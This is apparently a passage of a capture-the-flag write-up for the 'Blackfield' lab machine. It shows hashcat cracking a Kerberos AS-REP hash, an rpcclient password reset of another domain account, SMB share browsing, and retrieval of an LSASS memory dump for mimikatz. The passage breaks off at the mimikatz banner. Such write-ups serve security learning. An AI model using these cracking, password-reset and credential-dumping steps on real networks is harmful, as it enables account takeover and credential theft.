<span class="n">OpenCL</span> <span class="nc">API </span><span class="p">(</span><span class="n">OpenCL</span> <span class="mf">2.1</span> <span class="p">)</span> <span class="o">-</span> <span class="n">Platform</span> <span class="c1">#1 [Intel(R) Corporation]
</span><span class="o">=============================================================</span>
<span class="o">*</span> <span class="n">Device</span> <span class="c1">#1: Intel(R) HD Graphics 530, skipped
</span><span class="o">*</span> <span class="n">Device</span> <span class="c1">#2: Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, skipped
</span>
<span class="n">OpenCL</span> <span class="nc">API </span><span class="p">(</span><span class="n">OpenCL</span> <span class="mf">1.2</span> <span class="n">CUDA</span> <span class="mf">9.1</span><span class="p">.</span><span class="mi">112</span><span class="p">)</span> <span class="o">-</span> <span class="n">Platform</span> <span class="c1">#2 [NVIDIA Corporation]
</span><span class="o">=======================================================================</span>
<span class="o">*</span> <span class="n">Device</span> <span class="c1">#3: GeForce GTX 950M, 3392/4096 MB (1024 MB allocatable), 5MCU
</span>
<span class="n">Minimum</span> <span class="n">password</span> <span class="n">length</span> <span class="n">supported</span> <span class="n">by</span> <span class="n">kernel</span><span class="p">:</span> <span class="mi">0</span>
<span class="n">Maximum</span> <span class="n">password</span> <span class="n">length</span> <span class="n">supported</span> <span class="n">by</span> <span class="n">kernel</span><span class="p">:</span> <span class="mi">256</span>

<span class="n">Hashes</span><span class="p">:</span> <span class="mi">1</span> <span class="n">digests</span><span class="p">;</span> <span class="mi">1</span> <span class="n">unique</span> <span class="n">digests</span><span class="p">,</span> <span class="mi">1</span> <span class="n">unique</span> <span class="n">salts</span>
<span class="n">Bitmaps</span><span class="p">:</span> <span class="mi">16</span> <span class="n">bits</span><span class="p">,</span> <span class="mi">65536</span> <span class="n">entries</span><span class="p">,</span> <span class="mh">0x0000ffff</span> <span class="n">mask</span><span class="p">,</span> <span class="mi">262144</span> <span class="nb">bytes</span><span class="p">,</span> <span class="mi">5</span><span class="o">/</span><span class="mi">13</span> <span class="n">rotates</span>
<span class="n">Rules</span><span class="p">:</span> <span class="mi">1</span>

<span class="n">Applicable</span> <span class="n">optimizers</span><span class="p">:</span>
<span class="o">*</span> <span class="n">Zero</span><span class="o">-</span><span class="n">Byte</span>
<span class="o">*</span> <span class="n">Not</span><span class="o">-</span><span class="n">Iterated</span>
<span class="o">*</span> <span class="n">Single</span><span class="o">-</span><span class="n">Hash</span>
<span class="o">*</span> <span class="n">Single</span><span class="o">-</span><span class="n">Salt</span>

<span class="n">ATTENTION</span><span class="err">!</span> <span class="nc">Pure </span><span class="p">(</span><span class="n">unoptimized</span><span class="p">)</span> <span class="n">backend</span> <span class="n">kernels</span> <span class="n">selected</span><span class="p">.</span>
<span class="n">Using</span> <span class="n">pure</span> <span class="n">kernels</span> <span class="n">enables</span> <span class="n">cracking</span> <span class="n">longer</span> <span class="n">passwords</span> <span class="n">but</span> <span class="k">for</span> <span class="n">the</span> <span class="n">price</span> <span class="n">of</span> <span class="n">drastically</span> <span class="n">reduced</span> <span class="n">performance</span><span class="p">.</span>
<span class="n">If</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">switch</span> <span class="n">to</span> <span class="n">optimized</span> <span class="n">backend</span> <span class="n">kernels</span><span class="p">,</span> <span class="n">append</span> <span class="o">-</span><span class="n">O</span> <span class="n">to</span> <span class="n">your</span> <span class="n">commandline</span><span class="p">.</span>
<span class="n">See</span> <span class="n">the</span> <span class="n">above</span> <span class="n">message</span> <span class="n">to</span> <span class="n">find</span> <span class="n">out</span> <span class="n">about</span> <span class="n">the</span> <span class="n">exact</span> <span class="n">limits</span><span class="p">.</span>

<span class="n">Watchdog</span><span class="p">:</span> <span class="n">Temperature</span> <span class="n">abort</span> <span class="n">trigger</span> <span class="nb">set</span> <span class="n">to</span> <span class="mi">90</span><span class="n">c</span>

<span class="n">Host</span> <span class="n">memory</span> <span class="n">required</span> <span class="k">for</span> <span class="n">this</span> <span class="n">attack</span><span class="p">:</span> <span class="mi">151</span> <span class="n">MB</span>

<span class="n">Dictionary</span> <span class="n">cache</span> <span class="n">built</span><span class="p">:</span>
<span class="o">*</span> <span class="n">Filename</span><span class="p">..:</span> <span class="n">D</span><span class="p">:</span>\<span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
<span class="o">*</span> <span class="n">Passwords</span><span class="p">.:</span> <span class="mi">14344394</span>
<span class="o">*</span> <span class="n">Bytes</span><span class="p">.....:</span> <span class="mi">139921528</span>
<span class="o">*</span> <span class="n">Keyspace</span><span class="p">..:</span> <span class="mi">14344387</span>
<span class="o">*</span> <span class="n">Runtime</span><span class="p">...:</span> <span class="mi">2</span> <span class="n">secs</span>

<span class="n">Cracking</span> <span class="n">performance</span> <span class="n">lower</span> <span class="n">than</span> <span class="n">expected</span><span class="err">?</span>

<span class="o">*</span> <span class="n">Append</span> <span class="o">-</span><span class="n">O</span> <span class="n">to</span> <span class="n">the</span> <span class="n">commandline</span><span class="p">.</span>
  <span class="n">This</span> <span class="n">lowers</span> <span class="n">the</span> <span class="n">maximum</span> <span class="n">supported</span> <span class="n">password</span><span class="o">-</span> <span class="ow">and</span> <span class="n">salt</span><span class="o">-</span><span class="nf">length </span><span class="p">(</span><span class="n">typically</span> <span class="n">down</span> <span class="n">to</span> <span class="mi">32</span><span class="p">).</span>

<span class="o">*</span> <span class="n">Append</span> <span class="o">-</span><span class="n">w</span> <span class="mi">3</span> <span class="n">to</span> <span class="n">the</span> <span class="n">commandline</span><span class="p">.</span>
  <span class="n">This</span> <span class="n">can</span> <span class="n">cause</span> <span class="n">your</span> <span class="n">screen</span> <span class="n">to</span> <span class="n">lag</span><span class="p">.</span>

<span class="o">*</span> <span class="n">Update</span> <span class="n">your</span> <span class="n">backend</span> <span class="n">API</span> <span class="n">runtime</span> <span class="o">/</span> <span class="n">driver</span> <span class="n">the</span> <span class="n">right</span> <span class="n">way</span><span class="p">:</span>
  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">hashcat</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">faq</span><span class="o">/</span><span class="n">wrongdriver</span>

<span class="o">*</span> <span class="n">Create</span> <span class="n">more</span> <span class="n">work</span> <span class="n">items</span> <span class="n">to</span> <span class="n">make</span> <span class="n">use</span> <span class="n">of</span> <span class="n">your</span> <span class="n">parallelization</span> <span class="n">power</span><span class="p">:</span>
  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">hashcat</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">faq</span><span class="o">/</span><span class="n">morework</span>

<span class="err">$</span><span class="n">krb5asrep</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="n">support</span><span class="nd">@BLACKFIELD.LOCAL</span><span class="p">:</span><span class="mi">2</span><span class="n">ce9f8bdad0f788d565face046beea93</span><span class="err">$</span><span class="mi">49841</span><span class="n">d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d</span><span class="p">:</span><span class="c1">#00^BlackKnight
</span>
<span class="n">Session</span><span class="p">..........:</span> <span class="n">hashcat</span>
<span class="n">Status</span><span class="p">...........:</span> <span class="n">Cracked</span>
<span class="n">Hash</span><span class="p">.</span><span class="n">Name</span><span class="p">........:</span> <span class="n">Kerberos</span> <span class="mi">5</span><span class="p">,</span> <span class="n">etype</span> <span class="mi">23</span><span class="p">,</span> <span class="n">AS</span><span class="o">-</span><span class="n">REP</span>
<span class="n">Hash</span><span class="p">.</span><span class="n">Target</span><span class="p">......:</span> <span class="err">$</span><span class="n">krb5asrep</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="n">support</span><span class="nd">@BLACKFIELD.LOCAL</span><span class="p">:</span><span class="mi">2</span><span class="n">ce9f8bdad0f</span><span class="p">...</span><span class="mi">6</span><span class="n">ab74d</span>
<span class="n">Time</span><span class="p">.</span><span class="n">Started</span><span class="p">.....:</span> <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">11</span> <span class="mi">18</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">49</span> <span class="mi">2020</span> <span class="p">(</span><span class="mi">7</span> <span class="n">secs</span><span class="p">)</span>
<span class="n">Time</span><span class="p">.</span><span class="n">Estimated</span><span class="p">...:</span> <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">11</span> <span class="mi">18</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">56</span> <span class="mi">2020</span> <span class="p">(</span><span class="mi">0</span> <span class="n">secs</span><span class="p">)</span>
<span class="n">Guess</span><span class="p">.</span><span class="n">Base</span><span class="p">.......:</span> <span class="nc">File </span><span class="p">(</span><span class="n">D</span><span class="p">:</span>\<span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span>
<span class="n">Guess</span><span class="p">.</span><span class="n">Queue</span><span class="p">......:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span>
<span class="n">Speed</span><span class="p">.</span><span class="c1">#3.........:  2173.1 kH/s (7.12ms) @ Accel:128 Loops:1 Thr:64 Vec:1
</span><span class="n">Recovered</span><span class="p">........:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span> <span class="n">Digests</span>
<span class="n">Progress</span><span class="p">.........:</span> <span class="mi">14336000</span><span class="o">/</span><span class="mi">14344387</span> <span class="p">(</span><span class="mf">99.94</span><span class="o">%</span><span class="p">)</span>
<span class="n">Rejected</span><span class="p">.........:</span> <span class="mi">0</span><span class="o">/</span><span class="mi">14336000</span> <span class="p">(</span><span class="mf">0.00</span><span class="o">%</span><span class="p">)</span>
<span class="n">Restore</span><span class="p">.</span><span class="n">Point</span><span class="p">....:</span> <span class="mi">14295040</span><span class="o">/</span><span class="mi">14344387</span> <span class="p">(</span><span class="mf">99.66</span><span class="o">%</span><span class="p">)</span>
<span class="n">Restore</span><span class="p">.</span><span class="n">Sub</span><span class="p">.</span><span class="c1">#3...: Salt:0 Amplifier:0-1 Iteration:0-1
</span><span class="n">Candidates</span><span class="p">.</span><span class="c1">#3....: *toille*1410* -&gt; #!kayla
</span><span class="n">Hardware</span><span class="p">.</span><span class="n">Mon</span><span class="p">.</span><span class="c1">#3..: Temp: 54c Util: 47% Core: 928MHz Mem:2505MHz Bus:16
</span>
<span class="n">Started</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">11</span> <span class="mi">18</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">33</span> <span class="mi">2020</span>
<span class="n">Stopped</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">11</span> <span class="mi">18</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">57</span> <span class="mi">2020</span>
</code></pre></div></div>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="vg">$krb5asrep$23$support</span><span class="vi">@BLACKFIELD</span><span class="o">.</span><span class="no">LOCAL</span><span class="p">:</span><span class="mi">2</span><span class="n">ce9f8bdad0f788d565face046beea93</span><span class="vg">$49841d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d</span><span class="p">:</span><span class="c1">#00^BlackKnight</span>

</code></pre></div></div>
<p>So the password of <code class="language-plaintext highlighter-rouge">support</code> is <code class="language-plaintext highlighter-rouge">#00^BlackKnight</code></p>

<h3 id="as-i-got-the-password-of-support-i-tried-to-login-in-via-evil-winrm-but-no-luck-then-i-decided-to-use-rpcclient-to-enumerate-further">As I got the password of <code class="language-plaintext highlighter-rouge">support</code> I tried to login in via <code class="language-plaintext highlighter-rouge">evil-winrm</code> but no luck. Then I decided to use <code class="language-plaintext highlighter-rouge">rpcclient</code> to enumerate further.</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient blackfield.htb -U support 
Enter WORKGROUP\support's password: 
rpcclient $&gt; 
</code></pre></div></div>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rpcclient</span> <span class="vg">$&gt;</span> <span class="n">enumprivs</span>
<span class="n">found</span> <span class="mi">35</span> <span class="n">privileges</span>

<span class="no">SeCreateTokenPrivilege</span>          <span class="mi">0</span><span class="p">:</span><span class="mi">2</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x2</span><span class="p">)</span>
<span class="no">SeAssignPrimaryTokenPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">3</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x3</span><span class="p">)</span>
<span class="no">SeLockMemoryPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">4</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x4</span><span class="p">)</span>
<span class="no">SeIncreaseQuotaPrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">5</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x5</span><span class="p">)</span>
<span class="no">SeMachineAccountPrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">6</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x6</span><span class="p">)</span>
<span class="no">SeTcbPrivilege</span>          <span class="mi">0</span><span class="p">:</span><span class="mi">7</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x7</span><span class="p">)</span>
<span class="no">SeSecurityPrivilege</span>             <span class="mi">0</span><span class="p">:</span><span class="mi">8</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x8</span><span class="p">)</span>
<span class="no">SeTakeOwnershipPrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">9</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x9</span><span class="p">)</span>
<span class="no">SeLoadDriverPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">10</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xa</span><span class="p">)</span>
<span class="no">SeSystemProfilePrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">11</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xb</span><span class="p">)</span>
<span class="no">SeSystemtimePrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">12</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xc</span><span class="p">)</span>
<span class="no">SeProfileSingleProcessPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">13</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xd</span><span class="p">)</span>
<span class="no">SeIncreaseBasePriorityPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">14</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xe</span><span class="p">)</span>
<span class="no">SeCreatePagefilePrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">15</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0xf</span><span class="p">)</span>
<span class="no">SeCreatePermanentPrivilege</span>              <span class="mi">0</span><span class="p">:</span><span class="mi">16</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x10</span><span class="p">)</span>
<span class="no">SeBackupPrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">17</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x11</span><span class="p">)</span>
<span class="no">SeRestorePrivilege</span>              <span class="mi">0</span><span class="p">:</span><span class="mi">18</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x12</span><span class="p">)</span>
<span class="no">SeShutdownPrivilege</span>             <span class="mi">0</span><span class="p">:</span><span class="mi">19</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x13</span><span class="p">)</span>
<span class="no">SeDebugPrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">20</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x14</span><span class="p">)</span>
<span class="no">SeAuditPrivilege</span>                <span class="mi">0</span><span class="p">:</span><span class="mi">21</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x15</span><span class="p">)</span>
<span class="no">SeSystemEnvironmentPrivilege</span>            <span class="mi">0</span><span class="p">:</span><span class="mi">22</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x16</span><span class="p">)</span>
<span class="no">SeChangeNotifyPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">23</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x17</span><span class="p">)</span>
<span class="no">SeRemoteShutdownPrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">24</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x18</span><span class="p">)</span>
<span class="no">SeUndockPrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">25</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x19</span><span class="p">)</span>
<span class="no">SeSyncAgentPrivilege</span>            <span class="mi">0</span><span class="p">:</span><span class="mi">26</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1a</span><span class="p">)</span>
<span class="no">SeEnableDelegationPrivilege</span>             <span class="mi">0</span><span class="p">:</span><span class="mi">27</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1b</span><span class="p">)</span>
<span class="no">SeManageVolumePrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">28</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1c</span><span class="p">)</span>
<span class="no">SeImpersonatePrivilege</span>          <span class="mi">0</span><span class="p">:</span><span class="mi">29</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1d</span><span class="p">)</span>
<span class="no">SeCreateGlobalPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">30</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1e</span><span class="p">)</span>
<span class="no">SeTrustedCredManAccessPrivilege</span>                 <span class="mi">0</span><span class="p">:</span><span class="mi">31</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x1f</span><span class="p">)</span>
<span class="no">SeRelabelPrivilege</span>              <span class="mi">0</span><span class="p">:</span><span class="mi">32</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x20</span><span class="p">)</span>
<span class="no">SeIncreaseWorkingSetPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">33</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x21</span><span class="p">)</span>
<span class="no">SeTimeZonePrivilege</span>             <span class="mi">0</span><span class="p">:</span><span class="mi">34</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x22</span><span class="p">)</span>
<span class="no">SeCreateSymbolicLinkPrivilege</span>           <span class="mi">0</span><span class="p">:</span><span class="mi">35</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x23</span><span class="p">)</span>
<span class="no">SeDelegateSessionUserImpersonatePrivilege</span>               <span class="mi">0</span><span class="p">:</span><span class="mi">36</span> <span class="p">(</span><span class="mh">0x0</span><span class="p">:</span><span class="mh">0x24</span><span class="p">)</span>
</code></pre></div></div>
<h3 id="checking-the-privileges-of-support-using-rpcclient-i-came-to-see-that-support-can-change-the-password-of-the-other-users">Checking the privileges of <code class="language-plaintext highlighter-rouge">support</code> using <code class="language-plaintext highlighter-rouge">rpcclient</code>, I came to see that <code class="language-plaintext highlighter-rouge">support</code> can change the password of the other users.</h3>

<blockquote>
  <p>This link can help in understanding this in more detail
<a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/">https://malicious.link/post/2017/reset-ad-user-password-with-linux/</a>.</p>
</blockquote>

<h2 id="using-rpcclient-to-change-the-password-of-audit2020">Using <code class="language-plaintext highlighter-rouge">rpcclient</code> to change the password of <code class="language-plaintext highlighter-rouge">audit2020</code>.</h2>

<p><code class="language-plaintext highlighter-rouge">rpcclient $&gt; setuserinfo2 audit2020 23 'Password@123'</code></p>

<p>So I’ve successfully changed the password of <code class="language-plaintext highlighter-rouge">audit2020</code>.</p>

<h3 id="from-the-smb-enumeration-in-the-starting-there-is-a-folder-called-forensic-with-the-help-of-user-audit2020-i-can-see-the-things-in-it">From the <code class="language-plaintext highlighter-rouge">smb</code> enumeration in the starting, there is a folder called <code class="language-plaintext highlighter-rouge">forensic</code>, with the help of user <code class="language-plaintext highlighter-rouge">audit2020</code> I can see the things in it.</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="nd">@Ac3</span><span class="p">:</span><span class="o">~</span><span class="c1"># smbclient  //blackfield.htb/forensic -U audit2020
</span><span class="n">Enter</span> <span class="n">WORKGROUP</span>\<span class="n">audit2020</span><span class="sh">'</span><span class="s">s password: 
Try </span><span class="sh">"</span><span class="s">help</span><span class="sh">"</span><span class="s"> to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                7846143 blocks of size 4096. 3821004 blocks available
smb: \&gt; 

</span></code></pre></div></div>
<h3 id="as-we-can-see-that-that-thing-works">As we can see that that thing <code class="language-plaintext highlighter-rouge">works</code>.</h3>

<h3 id="checking-juicy-info">Checking Juicy Info</h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> <span class="nb">cd </span>commands_output
smb: <span class="se">\c</span>ommands_output<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Sun Feb 23 13:14:37 2020
  ..                                  D        0  Sun Feb 23 13:14:37 2020
  domain_admins.txt                   A      528  Sun Feb 23 08:00:19 2020
  domain_groups.txt                   A      962  Sun Feb 23 07:51:52 2020
  domain_users.txt                    A    16454  Fri Feb 28 17:32:17 2020
  firewall_rules.txt                  A   518202  Sun Feb 23 07:53:58 2020
  ipconfig.txt                        A     1782  Sun Feb 23 07:50:28 2020
  netstat.txt                         A     3842  Sun Feb 23 07:51:01 2020
  route.txt                           A     3976  Sun Feb 23 07:53:01 2020
  systeminfo.txt                      A     4550  Sun Feb 23 07:56:59 2020
  tasklist.txt                        A     9990  Sun Feb 23 07:54:29 2020

                7846143 blocks of size 4096. 3821004 blocks available
smb: <span class="se">\c</span>ommands_output<span class="se">\&gt;</span> <span class="nb">cd</span> ..
smb: <span class="se">\&gt;</span> <span class="nb">cd </span>memory_analysis
smb: <span class="se">\m</span>emory_analysis<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020                                                                                                                                                                 
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020                                                                                                                                                                 
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020                                                                                                                                                                 
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020                                                                                                                                                                 
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020                                                                                                                                                                 
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020                                                                                                                                                                 
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020                                                                                                                                                                 
                                                                                                                                                                                                                                           
                7846143 blocks of size 4096. 3821004 blocks available                                                                                                                                                                      
smb: <span class="se">\m</span>emory_analysis<span class="se">\&gt;</span>  
</code></pre></div></div>
<h3 id="so-from-the-above-we-can-see-lsasszip-in-memory_analysis-folder-now-i-can-extract-the-lsasszip-and-use-mimikatz-to-get-the-ntlm-hash">So from the above we can see <code class="language-plaintext highlighter-rouge">lsass.zip</code> in <code class="language-plaintext highlighter-rouge">memory_analysis</code> folder, now I can extract the <code class="language-plaintext highlighter-rouge">lsass.zip</code> and use <code class="language-plaintext highlighter-rouge">mimikatz</code> to get the <code class="language-plaintext highlighter-rouge">NTLM</code> hash.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">oot</span><span class="vi">@Ac3</span><span class="ss">:~</span><span class="c1"># smbclient  //blackfield.htb/forensic -U audit2020                                                                                                                                                                              </span>
<span class="no">Enter</span> <span class="no">WORKGROUP</span><span class="p">\</span><span class="n">audit2020</span><span class="err">'</span><span class="n">s</span> <span class="ss">password: 
</span><span class="no">Try</span> <span class="s2">"help"</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="n">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="p">.</span>
<span class="nf">smb</span><span class="p">:</span> <span class="p">\</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="n">memory_analysis</span>
<span class="ss">smb: </span><span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">get</span> <span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span>
<span class="n">parallel_read</span> <span class="n">returned</span> <span class="no">NT_STATUS_IO_TIMEOUT</span>
<span class="ss">smb: </span><span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="o">&gt;</span> <span class="n">get</span> <span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span>
<span class="n">getting</span> <span class="n">file</span> <span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">41936098</span> <span class="n">as</span> <span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span> <span class="n">getting</span> <span class="n">file</span> <span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">41936098</span> <span class="n">as</span> <span class="n">lsass</span><span class="p">.</span><span class="nf">zip</span> <span class="p">(</span><span class="mf">1099.1</span> <span class="no">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span> <span class="p">(</span><span class="n">average</span> <span class="mf">1099.1</span> <span class="no">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span>
<span class="ss">smb: </span><span class="p">\</span><span class="n">memory_analysis</span><span class="p">\</span><span class="o">&gt;</span> 
</code></pre></div></div>
<h2 id="using-mimikatz">Using Mimikatz</h2>

<p>There are many blogs which are helpful how to use <code class="language-plaintext highlighter-rouge">mimikatz</code> for <code class="language-plaintext highlighter-rouge">hashdump</code> from <code class="language-plaintext highlighter-rouge">lsass </code></p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mimikatz_trunk</span><span class="p">\</span><span class="n">x64</span><span class="o">&gt;</span><span class="n">mimikatz</span><span class="p">.</span><span class="nf">exe</span>

  <span class="o">.</span><span class="c1">#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59</span>
 <span class="o">.</span><span class="c1">## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span>
 <span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
 <span class="c1">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
